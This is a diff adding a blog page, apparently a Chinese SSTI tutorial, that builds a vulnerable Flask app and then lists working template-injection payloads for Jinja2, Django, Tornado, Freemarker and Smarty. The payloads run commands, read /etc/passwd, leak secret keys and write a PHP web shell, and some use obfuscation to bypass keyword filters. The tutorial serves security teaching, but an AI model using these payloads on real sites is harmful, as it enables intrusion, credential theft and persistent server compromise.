@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        
+    
+    <link rel='stylesheet' href="/./css/dracula.css">
+
+        <title>SSTI</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2.0">
+<link rel="stylesheet" href="/css/style.css">
+<link rel="shortcut icon" href="/favicon.ico">
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="manifest" href="/site.webmanifest">
+
+    <meta name="generator" content="Hexo 6.3.0"></head>
+    <body>
+        <header class="al_header al_pos_fixed">
+    <div class="al_header_container dis_flex_jcenter">
+        <div class="al_header_container_left">
+            <div class="al_header_site_title">
+                <a href="/">Hexo</a>
+            </div>
+        </div>
+
+        <div class="dis_flex_jcenter">
+            <div class="al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-menu"></use>
+                </svg>
+            </div>
+        </div>
+    </div>
+</header>
+
+        <div class="al_sidebar">
+
+    <div class="al_sidebar_overlay al_full_cover"></div>
+
+    <div class="al_pos_fixed al_sidebar_cnt">
+        <div class="dis_flex_acenter al_sidebar_header">
+            <h3>Hexo</h3>
+            <div class="al_sidebar_close al_header_setting">
+                <svg class="al_header_icon">
+                    <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-close"></use>
+                </svg>
+            </div>
+        </div>
+
+        <div class="al_sidebar_author_cnt">
+
+            <div class="al_sidebar_author_info">
+                <h4>John Doe</h4>
+                <img class="al_sidebar_avatar" src="https://yourAvatorURL">
+                <p></p>
+            </div>
+
+            
+        </div>
+    </div>
+</div>
+
+        
+    <div class="dis_flex_center al_lightbox_cnt al_full_cover">
+        <img class="al_lightbox_img"/>
+    </div>
+    <div class="al_page_background dis_flex_center al_full_cover"></div>
+    <div class="al_page_container">
+        <div class="al_pos_ab al_fake_background"></div>
+        <div class="al_main_container al_shadow al_main_page_container">
+            <article class="al_article">
+                <header>
+                    <h1 class="al_page_title">
+                        SSTI
+                    </h1>
+                    <div class="al_page_info dis_flex">
+                        <div class="al_page_content_info">
+                            Thu June 29, 2023 02:56 PM
+                        </div>
+
+                        
+
+                        
+                        <span class="tags"></span>
+                    </div>
+                </header>
+
+                
+                    <div class="al_page_content_outline">
+                        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssti%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">ssti漏洞成因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A8%A1%E6%9D%BF"><span class="toc-text">什么是模板</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFssti"><span class="toc-text">什么是ssti</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask%E7%8E%AF%E5%A2%83%E6%9C%AC%E5%9C%B0%E6%90%AD%E5%BB%BA"><span class="toc-text">flask环境本地搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#route%E8%A3%85%E9%A5%B0%E5%99%A8%E8%B7%AF%E7%94%B1"><span class="toc-text">route装饰器路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93"><span class="toc-text">模板渲染</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#flask%E5%AE%9E%E6%88%98"><span class="toc-text">flask实战</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssti"><span class="toc-text">如何利用ssti</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E9%87%8C%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="toc-text">python里的魔术方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81payload"><span class="toc-text">常见payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssti%E4%B8%80%E4%BA%9B%E7%BB%95%E8%BF%87"><span class="toc-text">ssti一些绕过</span></a></li></ol></li></ol>
+                    </div>
+                
+
+                
+                <section id="post-body">
+                    <h1 id="ssti漏洞成因"><a href="#ssti漏洞成因" class="headerlink" title="ssti漏洞成因"></a>ssti漏洞成因</h1><p>ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty  twig，java框架jade  velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞</p>
+<p><em>以下以python为例</em></p>
+<h1 id="什么是模板"><a href="#什么是模板" class="headerlink" title="什么是模板"></a>什么是模板</h1><p>模板是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
+<p>简单来说就是，把数据套到模板里，然后渲染引擎把套在模板里的数据生成html文本，返回给浏览器</p>
+<p>举个例子：</p>
+<p>我们想要呈现每个用户不同的名字，我们可以使用如下代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可把用户输入的url、传入的参数或者cookie渲染到<code>&#123;$what&#125;</code>  里，然后再在浏览器中显示出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;znskiw&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h1 id="什么是ssti"><a href="#什么是ssti" class="headerlink" title="什么是ssti"></a>什么是ssti</h1><p>比如说我们url是这样的：<code>127.0.0.1/?id=&#123; &#123;7*7&#125; &#125;</code>,结果会返回49。如果我们url是:<code>127.0.0.1/?id=&#123; &#123;config&#125; &#125;</code>,就会返回配置文件。在{ {} }里，他将我们的代码进行了执行，用户插入了恶意代码同样也会执行。</p>
+<h1 id="flask环境本地搭建"><a href="#flask环境本地搭建" class="headerlink" title="flask环境本地搭建"></a>flask环境本地搭建</h1><p>最基本的框架如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from flask import  Flask    #导入Flask类</span><br><span class="line">app=Flask(__name__)         #实例化并命名为app实例</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    app.run(port=2020,host=&quot;127.0.0.1&quot;,debug=True)   #调用run方法，设定端口号，启动服务。debug=True可以让我们每次更新代码，都不用重新运行代码</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过127.0.0.1:2020来查看我们搭建的web服务，这时页面报错是因为我们没有添加内容。</p>
+<h2 id="route装饰器路由"><a href="#route装饰器路由" class="headerlink" title="route装饰器路由"></a>route装饰器路由</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>使用route（）装饰器告诉Flask什么样的URL能触发我们的函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def test()&quot;</span><br><span class="line">   return &#x27;123&#x27;</span><br><span class="line">#访问127.0.0.1:5000/会输出123</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/test&#x27;)</span><br><span class="line">def test()&quot;</span><br><span class="line">   return &#x27;123&#x27;</span><br><span class="line">#访问127.0.0.1:5000/test会输出123</span><br></pre></td></tr></table></figure>
+
+<p>我们还可以设置动态网址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&quot;/&lt;username&gt;&quot;)</span><br><span class="line">def hello_user(username):</span><br><span class="line">  return &quot;hello:%s&quot;%username</span><br></pre></td></tr></table></figure>
+
+<p>结果会是这样：<img src="/2023/06/29/SSTI/1.png" alt="1"></p>
+<h2 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h2><p>可以使用 render_template() 方法来渲染模板。需要做的就是将模板名和你想作为关键字的参数传入模板的变量</p>
+<p>举个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&quot;index.html&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=2020, host=&quot;127.0.0.1&quot;, debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>如果这样的话，py会报错，因为找不到我们设的模板index.html。flask框架在使用这个模板函数时，默认去寻找项目文件夹下的templates文件夹里的html文件。因此我们需要先新建一个templates文件夹，然后在里面新建一个index.html文件。</p>
+<p>内容比如如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome to 2020&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   znskiw</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">   &lt;p&gt;这是采用render_template模板方法获得的内容&lt;/p&gt;</span><br><span class="line">   &lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/SSTI/2.png" alt="2"></p>
+<p>我们还可以用模板渲染参数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&lt;data&gt;&#x27;)</span><br><span class="line">def index(data):</span><br><span class="line">    return render_template(&quot;index.html&quot;,data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=2020, host=&quot;127.0.0.1&quot;, debug=True)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;welcome to 2020&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &#123; &#123;data&#125; &#125;</span><br><span class="line">  &lt;hr&gt;</span><br><span class="line">   &lt;p&gt;这是采用render_template模板方法获得的内容:&lt;/p&gt;</span><br><span class="line">   &lt;br&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/29/SSTI/3.png" alt="3"></p>
+<h1 id="flask实战"><a href="#flask实战" class="headerlink" title="flask实战"></a>flask实战</h1><p>这里我们提供一个有问题的代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/test&#x27;,methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def test():</span><br><span class="line">    template = &#x27;&#x27;&#x27;</span><br><span class="line">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">            &lt;h1&gt;Oh no!That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="line">            &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &#x27;&#x27;&#x27; % request.args[&quot;x&quot;]</span><br><span class="line"></span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=2020, host=&quot;127.0.0.1&quot;, debug=True)</span><br></pre></td></tr></table></figure>
+
+<p>程序员因为省事并不会专门写一个html文件，而是直接用render_template_string函数当字符串来渲染。使用render_template_string函数在渲染模板的时候使用了%s来动态的替换字符串，在渲染的时候会把 <code>&#123; &#123;xxx&#125; &#125; </code>包裹的xxx内容当做变量解析替换，并且request.url是可控的，这就导致了ssti漏洞</p>
+<p>可以看到我们输入<code>&#123; &#123;2*2&#125; &#125;</code>，返回了4</p>
+<p><img src="/2023/06/29/SSTI/4.png" alt="4"></p>
+<p>正确代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&#x27;/test&#x27;)</span><br><span class="line">def index():</span><br><span class="line">   return render_template(&quot;index.html&quot;,title=&#x27;Home&#x27;,user=request.args.get(&quot;x&quot;))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    app.run(port=2020, host=&quot;127.0.0.1&quot;, debug=True)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">           &lt;h1&gt;Oh no!That page doesn&#x27;t exist.&lt;/h1&gt;</span><br><span class="line">           &lt;h3&gt;&#123; &#123;user&#125; &#125;&lt;/h3&gt;</span><br><span class="line">       &lt;/div&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这时可以看出，没有ssti漏洞</p>
+<p><img src="/2023/06/29/SSTI/5.png" alt="5"></p>
+<h1 id="如何利用ssti"><a href="#如何利用ssti" class="headerlink" title="如何利用ssti"></a>如何利用ssti</h1><p>现在我们已经知道了在flask中<code>&#123; &#123;&#125; &#125;</code>里面的代码将会执行，但是我们应该怎么利用呢</p>
+<h2 id="python里的魔术方法"><a href="#python里的魔术方法" class="headerlink" title="python里的魔术方法"></a>python里的魔术方法</h2><p>所有的子类都有一个共同的父类object,如果没指定继承，默认父类是object</p>
+<ul>
+<li><code>__class__</code>:返回当前类(输入abc或””是字符串类，()是元组类，{}是字典类，[]是列表类等)</li>
+<li><code>__base__</code>：返回当前类父类</li>
+<li><code>__bases__</code>以元组的形式返回所有父类（元组可通过索引访问,即<code>__bases__[0]</code>等于<code>__base__</code>）</li>
+<li><code>__mor__</code>:返回类的调用顺序(当前类-&gt;父类-&gt;父类的父类-&gt; ……)</li>
+</ul>
+<p><img src="/2023/06/29/SSTI/6.png" alt="6"></p>
+<ul>
+<li><p><code>__subclasses__()</code>:以列表的方式返回对象的子类。像这个语句：<code>print(&quot;&quot;.__class__.__base__.__subclasses__())``&quot;&quot;.__class__.__base__</code>是object，他的<code>__subclasses__()</code>就是所有的类</p>
+<p><img src="/2023/06/29/SSTI/7.png" alt="7"></p>
+<p>这就是构造payload里关键的一点，用这三个魔术方法找到所有的类，接下来就是在这所有的类里，寻找我们可以调用的方法</p>
+</li>
+<li><p><code>__init__ </code> :初始化类</p>
+</li>
+<li><p><code>__globals__  </code> :使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。</p>
+<p><code>__init__.__globals__</code>一起用，就可以查找可以用的方法</p>
+<p><img src="/2023/06/29/SSTI/8.png" alt="8"></p>
+<p>里面我们有个可以使用的方法：<code>__builtins__</code>,构造payload：<code>&#123; &#123;&#39;&#39;.__class__.__base__.__subclasses__()[128].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#39;)&#125; &#125;</code></p>
+<p><img src="/2023/06/29/SSTI/9.png" alt="9"></p>
+<p>成功执行whoami</p>
+<h2 id="常见payload"><a href="#常见payload" class="headerlink" title="常见payload"></a>常见payload</h2><p>这里payload涉及到太多的方法，构造起来难度较大，这里记录一些常用的payload，以后遇到这些之外的再补充：</p>
+<p>1-python</p>
+<ul>
+<li>fuzz<ul>
+<li><code>&#123; &#123;6*6&#125; &#125;</code></li>
+</ul>
+</li>
+</ul>
+<p>flask（jinja2）</p>
+<ul>
+<li>查看文件夹<ul>
+<li><code>&#123; &#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].listdir(&#39;./&#39;)&#125; &#125;</code>这里的<code>./</code>是路径</li>
+</ul>
+</li>
+<li>读取文件<ul>
+<li><code>&#123; &#123;&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;filename&#39;).read()&#125; &#125;</code></li>
+<li><code>().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#39; )</code></li>
+<li><code>request[&#39;__cl&#39;+&#39;ass__&#39;].__base__.__base__.__base__[&#39;__subcla&#39;+&#39;sses__&#39;]()[60][&#39;__in&#39;+&#39;it__&#39;][&#39;__&#39;+&#39;glo&#39;+&#39;bal&#39;+&#39;s__&#39;][&#39;__bu&#39;+&#39;iltins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#39;__im&#39;+&#39;port__(&quot;os&quot;).po&#39;+&#39;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#39;+&#39;ad()&#39;)</code></li>
+</ul>
+</li>
+<li>RCE<ul>
+<li><code>object.__subclasses__()[59].__init__.func_globals[&#39;linecache&#39;].__dict__[&#39;o&#39;+&#39;s&#39;].__dict__[&#39;sy&#39;+&#39;stem&#39;](&#39;ls&#39;)</code></li>
+</ul>
+</li>
+<li>查看配置项<ul>
+<li><code>&#123; &#123; url_for.__globals__[&#39;current_app&#39;].config[&#39;FLAG&#39;]&#125;</code></li>
+</ul>
+</li>
+</ul>
+<p>django</p>
+<ul>
+<li>查看配置项<ul>
+<li><code>&#123; &#123;settings&#125; &#125;</code> （settings.SECRET_KEY）</li>
+<li><code>&#123; &#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125; &#125;</code></li>
+</ul>
+</li>
+</ul>
+<p>tornado</p>
+<ul>
+<li>查看设置常量<ul>
+<li><code>&#123; &#123;handler.settings&#125; &#125;</code></li>
+</ul>
+</li>
+<li>RCE<ul>
+<li><code>&#123; &#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals[&#39;linecache&#39;].os.popen(&#39;ls&#39;).read() &#125; &#125;</code></li>
+</ul>
+</li>
+</ul>
+<p>2-java</p>
+<p>freemarker</p>
+<ul>
+<li>RCE<ul>
+<li><code>&lt;#assign test=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123;test(&quot;ls&quot;)&#125;</code></li>
+</ul>
+</li>
+<li>沙盒逃逸+ 文件读取<ul>
+<li><code>$&#123;object.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve(&#39;/etc/passwd&#39;).toURL().openStream().readAllBytes()?join(&quot; &quot;)&#125;</code></li>
+</ul>
+</li>
+</ul>
+<p>3-php</p>
+<p>smarty</p>
+<ul>
+<li>读取文件<ul>
+<li><code>&#123;self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)&#125;</code></li>
+</ul>
+</li>
+<li>写入文件<ul>
+<li><code>&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</code></li>
+</ul>
+</li>
+</ul>
+<h2 id="ssti一些绕过"><a href="#ssti一些绕过" class="headerlink" title="ssti一些绕过"></a>ssti一些绕过</h2><p>1.过滤[]等括号</p>
+<p>使用gititem绕过。如原poc <code>&#123; &#123;&quot;&quot;.__class__.__bases__[0]&#125; &#125;</code></p>
+<p>绕过后<code>&#123; &#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125; &#125;</code></p>
+<p>2.过滤了subclasses，拼凑法</p>
+<p>原poc<code>&#123; &#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()&#125; &#125;</code></p>
+<p>绕过 <code>&#123; &#123;&quot;&quot;.__class__.__bases__[0][&#39;__subcla&#39;+&#39;sses__&#39;]</code></p>
+<p>3、过滤class</p>
+<p>使用session</p>
+<p><code>&#123; &#123;session[&#39;__cla&#39;+&#39;ss__&#39;].__mro__[12]&#125; &#125;</code></p>
+<p>4、过滤init</p>
+<p>可以用<code>__enter__</code>或<code>__exit__</code>替代</p>
+<p>5、一些常用绕过的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;ls  /var/www/html&quot;).read()&#x27; )</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals[&#x27;linecache&#x27;].__dict__[&#x27;o&#x27;+&#x27;s&#x27;].__dict__[&#x27;sy&#x27;+&#x27;stem&#x27;](&#x27;ls&#x27;)</span><br><span class="line"></span><br><span class="line">&#123; &#123;request[&#x27;__cl&#x27;+&#x27;ass__&#x27;].__base__.__base__.__base__[&#x27;__subcla&#x27;+&#x27;sses__&#x27;]()[60][&#x27;__in&#x27;+&#x27;it__&#x27;][&#x27;__&#x27;+&#x27;glo&#x27;+&#x27;bal&#x27;+&#x27;s__&#x27;][&#x27;__bu&#x27;+&#x27;iltins__&#x27;][&#x27;ev&#x27;+&#x27;al&#x27;](&#x27;__im&#x27;+&#x27;port__(&quot;os&quot;).po&#x27;+&#x27;pen(&quot;ca&quot;+&quot;t a.php&quot;).re&#x27;+&#x27;ad()&#x27;)&#125; &#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+
+                </section>
+
+                
+                
+
+                
+
+            </article>
+
+            
+            <nav class="dis_flex al_post_nav">
+                <a class="al_post_nav_item dis_flex_acenter" href="/">
+                    
+                </a>
+                <a class="al_post_nav_item dis_flex_acenter" href="/2023/06/28/ISCC2023-MISC/">
+                    
+                        <span class="al_text_ellipsis al_post_nav_desc">ISCC2023 MISC</span>
+                        <svg class="al_arrow">
+                            <use xmlns="http://www.w3.org/2000/svg" xlink:href="/assets/svg_icons.svg#svg-arrow-right"></use>
+                        </svg>
+                    
+                </a>
+            </nav>
+        </div>
+    </div>
+
+
+        <div class="al_index_footer dis_flex_center">
+    <div class="al_index_footer_item al_index_footer_title">
+        John Doe
+    </div>
+
+    
+    
+
+    <div class="al_index_footer_item al_index_footer_extra">
+        Created By 
+        <a target="_blank" rel="noopener" href="https://github.com/iGuan7u/Acetolog">AcetoLog</a>
+         · Power By 
+        <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
+    </div>
+
+    <div class="al_index_footer_item al_index_footer_extra_right">
+        All Right Reserved
+    </div>
+</div>
+
+        <script type="text/javascript" async="async" src="/javascripts/acelog.js"></script>
+        
+        
+        
+        
+        
+
+    </body>
+</html>
